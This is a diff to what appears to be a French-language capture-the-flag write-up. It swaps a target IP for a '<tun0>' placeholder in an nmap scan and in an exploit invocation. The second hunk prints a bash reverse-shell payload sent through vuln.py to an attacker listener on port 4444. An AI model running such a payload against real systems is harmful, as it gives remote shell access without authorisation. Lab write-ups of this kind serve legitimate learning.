@@ -15,9 +15,9 @@
 
 ```bash
 ┌──(kali㉿kali)-[~/Téléchargements]
-└─$ nmap -sC -sV -oA Connectes 10.129.245.100
+└─$ nmap -sC -sV -oA Connectes <tun0>
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 11:07 +0200
-Nmap scan report for 10.129.245.100
+Nmap scan report for <tun0>
 Host is up (0.024s latency).
 Not shown: 997 filtered tcp ports (no-response)
 PORT    STATE SERVICE   VERSION
@@ -285,7 +285,7 @@ if __name__ == "__main__":
 ```
 
 ```bash
-python3 vuln.py --rhost 10.129.245.100 --command "bash -i >& /dev/tcp/10.10.14.236/4444 0>&1"
+python3 vuln.py --rhost <tun0> --command "bash -i >& /dev/tcp/10.10.14.236/4444 0>&1"
 ```
 
 ```bash
